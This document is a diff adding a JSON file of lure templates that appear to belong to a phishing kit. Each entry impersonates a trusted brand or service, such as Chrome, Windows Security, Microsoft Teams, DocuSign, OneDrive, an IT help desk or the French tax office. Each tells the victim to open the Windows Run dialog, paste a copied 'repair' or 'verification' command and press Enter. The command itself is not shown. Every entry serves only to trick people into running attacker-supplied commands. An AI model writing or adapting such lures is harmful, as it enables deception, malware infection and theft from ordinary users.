@@ -1,0 +1,306 @@
+{
+  "browser_update": {
+    "brand": "Chrome",
+    "badge": "Connection interrupted",
+    "headline": "Your download was blocked by the browser",
+    "sub": "The file never finished transferring. Run the recovery command below to restart the download.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the command with Ctrl + V",
+      "Press Enter"
+    ],
+    "copy": "Copy recovery command",
+    "copied": "Copied — now paste it",
+    "continue": "I ran it — continue",
+    "accent": "#2563eb",
+    "dark": true
+  },
+  "captcha": {
+    "brand": "Verification",
+    "badge": "Human verification required",
+    "headline": "Complete the check to view this page",
+    "sub": "Your session could not be validated automatically. The console command below finishes the verification.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the verification key",
+      "Press Enter"
+    ],
+    "copy": "Copy verification key",
+    "copied": "Copied — now paste it",
+    "continue": "Continue to the page",
+    "accent": "#059669",
+    "dark": false
+  },
+  "file_blocked": {
+    "brand": "Windows Security",
+    "badge": "File quarantined",
+    "headline": "This file was blocked for your protection",
+    "sub": "SmartScreen could not verify the publisher. Restore the download with the command below.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the restore command",
+      "Press Enter"
+    ],
+    "copy": "Copy restore command",
+    "copied": "Copied — now paste it",
+    "continue": "Open the file",
+    "accent": "#dc2626",
+    "dark": true
+  },
+  "mail_attachment": {
+    "brand": "Mail",
+    "badge": "Attachment failed",
+    "headline": "The attachment could not be opened",
+    "sub": "The mail client stopped the attachment. Launch the repair command to open it.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the repair command",
+      "Press Enter"
+    ],
+    "copy": "Copy repair command",
+    "copied": "Copied — now paste it",
+    "continue": "Open attachment",
+    "accent": "#7c3aed",
+    "dark": false
+  },
+  "it_support": {
+    "brand": "IT Service Desk",
+    "badge": "Ticket #4821",
+    "headline": "Diagnostics required to restore access",
+    "sub": "Support asked you to run a short diagnostic. Paste it into the Run dialog and press Enter.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the diagnostic command",
+      "Press Enter"
+    ],
+    "copy": "Copy diagnostic command",
+    "copied": "Copied — now paste it",
+    "continue": "Done — return to ticket",
+    "accent": "#0891b2",
+    "dark": false
+  },
+  "share_link": {
+    "brand": "SharePoint",
+    "badge": "Document shared with you",
+    "headline": "The preview link needs a quick fix",
+    "sub": "Previewing stopped halfway. Run the command to rebuild the link, then continue.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the link repair command",
+      "Press Enter"
+    ],
+    "copy": "Copy repair command",
+    "copied": "Copied — now paste it",
+    "continue": "Open the document",
+    "accent": "#0f766e",
+    "dark": true
+  },
+  "voicemail": {
+    "brand": "Microsoft Teams",
+    "badge": "1 new voicemail",
+    "headline": "You have a new voicemail message",
+    "sub": "The audio could not be decoded in the browser. Run the command below to open it in the desktop app.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the audio decode command",
+      "Press Enter"
+    ],
+    "copy": "Copy decode command",
+    "copied": "Copied — now paste it",
+    "continue": "Listen to voicemail",
+    "accent": "#6264a7",
+    "dark": true
+  },
+  "software_update": {
+    "brand": "Windows Update",
+    "badge": "Restart required",
+    "headline": "A critical update failed to install",
+    "sub": "Update KB5034441 could not be applied. Run the repair command below, then restart to finish.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the update repair command",
+      "Press Enter"
+    ],
+    "copy": "Copy repair command",
+    "copied": "Copied — now paste it",
+    "continue": "Continue to restart",
+    "accent": "#0078d4",
+    "dark": true
+  },
+  "cloud_sync": {
+    "brand": "OneDrive",
+    "badge": "Sync paused",
+    "headline": "Your files could not be synced",
+    "sub": "OneDrive stopped syncing because of a permission error. Run the command below to repair the sync client.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the sync repair command",
+      "Press Enter"
+    ],
+    "copy": "Copy repair command",
+    "copied": "Copied — now paste it",
+    "continue": "Resume syncing",
+    "accent": "#0078d4",
+    "dark": false
+  },
+  "printer_issue": {
+    "brand": "Print Spooler",
+    "badge": "Job stuck in queue",
+    "headline": "Your print job could not be completed",
+    "sub": "The spooler service is not responding. Run the command below to restart it and release the job.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the spooler restart command",
+      "Press Enter"
+    ],
+    "copy": "Copy restart command",
+    "copied": "Copied — now paste it",
+    "continue": "Retry print",
+    "accent": "#52525b",
+    "dark": false
+  },
+  "vpn_disconnect": {
+    "brand": "GlobalProtect",
+    "badge": "Connection lost",
+    "headline": "Your VPN tunnel dropped unexpectedly",
+    "sub": "The secure tunnel could not be re-established automatically. Run the command below to reconnect.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the reconnect command",
+      "Press Enter"
+    ],
+    "copy": "Copy reconnect command",
+    "copied": "Copied — now paste it",
+    "continue": "Reconnect",
+    "accent": "#ea580c",
+    "dark": true
+  },
+  "meeting_invite": {
+    "brand": "Outlook Calendar",
+    "badge": "Meeting starting soon",
+    "headline": "The meeting link is not working",
+    "sub": "The Teams join link returned an error. Run the command below to repair the calendar entry and rejoin.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the calendar repair command",
+      "Press Enter"
+    ],
+    "copy": "Copy repair command",
+    "copied": "Copied — now paste it",
+    "continue": "Join meeting",
+    "accent": "#0f6cbd",
+    "dark": false
+  },
+  "invoice": {
+    "brand": "Adobe Acrobat",
+    "badge": "Invoice PDF",
+    "headline": "This invoice could not be opened",
+    "sub": "The PDF renderer failed to load the document. Run the command below to open it in the desktop reader.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the PDF open command",
+      "Press Enter"
+    ],
+    "copy": "Copy open command",
+    "copied": "Copied — now paste it",
+    "continue": "Open invoice",
+    "accent": "#dc2626",
+    "dark": true
+  },
+  "docusign": {
+    "brand": "DocuSign",
+    "badge": "Signature required",
+    "headline": "A document is waiting for your signature",
+    "sub": "The browser signing session expired. Run the command below to open the document in the desktop signer.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the signer launch command",
+      "Press Enter"
+    ],
+    "copy": "Copy launch command",
+    "copied": "Copied — now paste it",
+    "continue": "Review & sign",
+    "accent": "#ffb81c",
+    "dark": false
+  },
+  "mfa_reset": {
+    "brand": "Identity Portal",
+    "badge": "Action required",
+    "headline": "Your MFA method needs to be re-registered",
+    "sub": "Your authenticator was unlinked. Run the command below to open the registration portal and re-enroll.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the registration command",
+      "Press Enter"
+    ],
+    "copy": "Copy registration command",
+    "copied": "Copied — now paste it",
+    "continue": "Register MFA",
+    "accent": "#7c3aed",
+    "dark": true
+  },
+  "delivery": {
+    "brand": "Colissimo",
+    "badge": "Colis en attente",
+    "headline": "Votre colis n'a pas pu être livré",
+    "sub": "Le livreur n'a pas trouvé personne. Suivez la commande ci-dessous pour choisir un nouveau créneau de livraison.",
+    "steps": [
+      "Appuyez sur la touche Windows + R",
+      "Collez la commande de suivi",
+      "Appuyez sur Entrée"
+    ],
+    "copy": "Copier la commande",
+    "copied": "Copié — collez-le maintenant",
+    "continue": "Choisir un créneau",
+    "accent": "#1d4ed8",
+    "dark": false
+  },
+  "tax_refund": {
+    "brand": "Impots.gouv.fr",
+    "badge": "Remboursement en cours",
+    "headline": "Un remboursement d'impôt vous est dû",
+    "sub": "Votre déclaration a été validée. Exécutez la commande ci-dessous pour recevoir le virement.",
+    "steps": [
+      "Appuyez sur la touche Windows + R",
+      "Collez la commande de traitement",
+      "Appuyez sur Entrée"
+    ],
+    "copy": "Copier la commande",
+    "copied": "Copié — collez-le maintenant",
+    "continue": "Recevoir le remboursement",
+    "accent": "#0f766e",
+    "dark": false
+  },
+  "wifi_portal": {
+    "brand": "Guest WiFi",
+    "badge": "Acceptable use policy",
+    "headline": "You must accept the policy to continue",
+    "sub": "The captive portal requires a local agent. Run the command below to complete registration.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the registration command",
+      "Press Enter"
+    ],
+    "copy": "Copy registration command",
+    "copied": "Copied — now paste it",
+    "continue": "Accept & connect",
+    "accent": "#0284c7",
+    "dark": true
+  },
+  "backup_failed": {
+    "brand": "Veeam Agent",
+    "badge": "Backup failed",
+    "headline": "Last night's backup did not complete",
+    "sub": "The snapshot could not be created. Run the command below to retry the backup job.",
+    "steps": [
+      "Press the Windows key + R",
+      "Paste the backup retry command",
+      "Press Enter"
+    ],
+    "copy": "Copy retry command",
+    "copied": "Copied — now paste it",
+    "continue": "Retry backup",
+    "accent": "#7c3aed",
+    "dark": true
+  }
+}
